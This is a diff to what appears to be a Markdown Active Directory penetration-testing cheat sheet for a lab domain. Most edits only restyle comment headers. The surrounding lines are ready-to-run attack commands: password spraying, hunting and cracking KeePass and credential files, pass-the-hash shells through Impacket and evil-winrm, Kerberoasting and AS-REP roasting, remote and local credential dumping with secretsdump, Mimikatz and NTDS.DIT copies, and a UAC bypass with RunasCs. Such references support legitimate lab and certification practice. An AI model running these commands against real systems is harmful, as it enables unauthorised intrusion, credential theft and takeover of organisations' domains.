@@ -139,7 +139,7 @@ Get-ADUser -Filter * -Server 172.16.150.10 -Property SamAccountName
 nxc smb 172.16.150.10 -u john -p 'Password123!' --groups
 crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --groups
 
-# CMD and PowerShell
+# -------------------- CMD and PowerShell --------------------
 
 # Domain groups
 net group /domain
@@ -165,7 +165,7 @@ Get-LocalGroupMember -Group "Administrators"
 ```
 ### SMB Shares Credentialed Access and Enumeration
 ```shell
-# Enumeration
+# -------------------- Enumeration --------------------
 
 # NetExec and CrackMapExec
 nxc smb 172.16.150.10 -u john -p 'Password123!' --shares
@@ -180,19 +180,20 @@ Get-SmbShare
 # enum4linux
 enum4linux -S 172.16.150.10
 
-# Connection
+# -------------------- Connection --------------------
 smbclient //172.16.150.10/Public -U john
 impacket-smbclient vorkharium.com/john:'Password123!'@172.16.150.10
 
 ```
 ### RPC Credentialed Access and Enumeration
 ```shell
+# With Password
 rpcclient -U "username%password" 172.16.150.10
 
 # Using hash
 rpcclient //172.16.150.10 -U vorkharium.com/john%1a06b4248879e68a498d3bac51bf91c9 --pw-nt-hash
 
-# All RPC Queries
+# -------------------- All RPC Queries --------------------
 srvinfo
 enumdomusers # Users
 enumpriv # Works like "whoami /priv"
@@ -218,12 +219,13 @@ gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
 ```
 ### Password Spraying
 ```shell
-# kerbrute.py
+# -------------------- kerbrute.py --------------------
 git clone https://github.com/TarlogicSecurity/kerbrute.git
 cd kerbrute
+
 python3 kerbrute.py -users usernames.txt -passwords passwords.txt -dc-ip 172.16.150.10 -domain vorkharium.com
 
-# NetExec
+# -------------------- NetExec --------------------
 
 # Password Spraying
 nxc smb 172.16.150.10 -u john -p passwords.txt
@@ -270,7 +272,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | f
 # Display stored credentials
 cmdkey /list
 
-# Finding and Cracking KeePass .kdbx Files
+# -------------------- Finding and Cracking KeePass .kdbx Files --------------------
 
 # CMD
 dir /s /b *.kdbx 
@@ -280,7 +282,7 @@ Get-ChildItem -Recurse -Filter *.kdbx
 keepass2john Database.kdbx > keepasshash
 john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash
 
-# Finding Files potentially containing Credentials
+# -------------------- Finding Files potentially containing Credentials --------------------
 
 # .db and KeePass .kdbx
 Get-ChildItem -Path C:\ -Include *.db, *.kdbx -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
@@ -302,7 +304,7 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 ```
 ### Runas and RunasCs.exe
 ```shell
-# Native Runas
+# -------------------- Native Runas --------------------
 
 # Local - Changing to user "jane"
 runas /user:jane cmd # # Enter the password now when asked
@@ -310,14 +312,14 @@ runas /user:jane cmd # # Enter the password now when asked
 # Domain - Changing to user "john"
 runas /netonly /user:vorkharium.com\john cmd
 
-# RunasCs.exe
+# -------------------- RunasCs.exe --------------------
 
 # Using RunasCs.exe with pwnednewuser (pwnednewuser is a new user with admin rights we added before through an exploit)
 ./RunasCs.exe pwnednewuser 'password123!' "cmd /c type C:\Users\Administrator\Desktop\root.txt" --bypass-uac --logon-type '8' --force-profile
 ```
 ### BloodHound, SharpHound.exe, bloodhound-python
 ```shell
-# BloodHound Collectors
+# -------------------- BloodHound Collectors --------------------
 
 # SharpHound v1.1.1 (Use version 1.1.1, otherwise SharpHound.exe results won't work and BloodHound will appear empty after loading them)
 ./SharpHound.exe --CollectionMethods All
@@ -327,6 +329,8 @@ runas /netonly /user:vorkharium.com\john cmd
 # bloodhound-python
 # Collect information with valid user "john"
 bloodhound-python -d vorkharium.com -u john -p 'Password123!' -ns 172.16.150.10 -c all --dns-tcp
+
+# -------------------- BloodHound --------------------
 
 # Starting BloodHound
 sudo neo4j console
@@ -364,7 +368,7 @@ For a complete and detailed list of all PowerView.ps1 commands check the followi
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
 ### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
 ```shell
-# Using Password
+# -------------------- Using Password --------------------
 
 # impacket-psexec with password
 impacket-psexec Administrator:'Password123!'@172.16.150.10
@@ -378,7 +382,7 @@ impacket-wmiexec vorkharium.com/Administrator:'Password123!'@172.16.150.10
 impacket-smbexec Administrator:'Password123!'@172.16.150.10
 impacket-smbexec vorkharium.com/Administrator:'Password123!'@172.16.150.10
 
-# Using Hash (Pass-the-Hash)
+# -------------------- Using Hash (Pass-the-Hash) --------------------
 
 # impacket-psexec with hash
 impacket-psexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
@@ -406,14 +410,12 @@ evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
 
 # Connection with share for file transfers
 xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
-sudo xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
 
 # With extra parameters
 xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Administrator /p:'Password123!' /d:vorkharium.com /drive:share,/home/kali/share
 
 # Using hash
 xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.10 /drive:share,/home/kali/share
-
 ```
 ### Kerberoasting with Impacket
 ```shell
@@ -439,7 +441,7 @@ impacket-GetNPUsers vorkharium.com/john -dc-ip 172.16.150.10 -request -no-pass
 # AS-REP Roasting with password
 impacket-GetNPUsers vorkharium.com/john:'Password123!' -dc-ip 172.16.150.10 -request -no-pass
 
-# Cracking the hash
+# -------------------- Cracking the hash --------------------
 
 # With Hashcat
 hashcat -m 18200 -a 0 jane_hash.txt /usr/share/wordlists/rockyou.txt
@@ -451,7 +453,7 @@ sudo john jane_hash.txt --show
 ```
 ### Remote Credential Dumping with Impacket and NetExec
 ```shell
-# Using Impacket
+# -------------------- Using Impacket --------------------
 
 # With password
 impacket-secretsdump vorkharium.com/john:'Password123!'@172.16.150.10
@@ -464,7 +466,7 @@ impacket-secretsdump -just-dc-user jane vorkharium.com/john:"Password123!"@172.1
 # Example with -dc-ip
 impacket-secretsdump -dc-ip 172.16.150.10 'vorkharium.com/john:"Password123!"@172.16.150.10'
 
-# With NetExec
+# -------------------- With NetExec --------------------
 
 # SAM
 nxc smb 172.16.150.20 -u john -p 'Password123!' --sam
@@ -489,7 +491,7 @@ nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.
 ```
 ### Local Credential Dumping with Mimikatz and Impacket
 ```shell
-# Mimikatz.exe
+# -------------------- Mimikatz.exe --------------------
 
 # Important Note: mimikatz.exe wont work from the evil-winrm console. Use nc to get shell instead
 # Run mimikatz.exe as administrator
@@ -511,7 +513,7 @@ lsadump::lsa /patch # Both of these dump SAM
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 
-# SAM and NTDS.DIT Dump
+# -------------------- SAM and NTDS.DIT Dump --------------------
 
 # reg.exe
 reg save hklm\sam 'C:\Windows\Temp\sam'
@@ -524,20 +526,19 @@ reg save hklm\security 'C:\Windows\Temp\security'
 Copy-FileSeBackupPrivilege V:\Windows\NTDS\NTDS.DIT C:\Users\john\Desktop\NTDS.DIT
 # Find a way to get NTDS.DIT and transfer it to Kali for local dump
 
-# impacket-secretsdump
+# -------------------- impacket-secretsdump --------------------
 
 # With Security
 impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
 
 # With NTDS.DIT
-
 impacket-secretsdump -system SYSTEM -sam SAM -ntds NTDS.DIT local
 
 # Without SECURITY and without NTDS.DIT (Still able to dump something interesting)
 impacket-secretsdump -sam SAM -system SYSTEM local
 
-# samdump2
-samdump2 system sam
+# -------------------- samdump2 --------------------
+samdump2 SYSTEM SAM
 
 # Note: Pay attention to case sensitive, upper and lower case. Try both tools always, one might fail
 ```
